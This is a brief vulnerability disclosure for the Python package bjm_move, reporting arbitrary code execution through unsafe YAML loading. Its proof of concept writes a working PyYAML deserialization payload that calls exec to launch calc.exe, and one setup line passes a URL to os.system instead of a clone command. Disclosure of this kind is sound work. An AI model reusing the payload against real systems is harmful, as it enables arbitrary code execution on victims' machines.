# Description

`bjm_move` package is vulnerable to `Arbitary Code Execution` due to insecure yaml desearilization.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

_steps to reproduce:_
```python
import os
os.system('https://github.com/lynchmv/bjm_move')
os.chdir('bjm_move/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""
open('db_config.yml','w+').write(payload)
os.system('python3 bjm_db.py')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
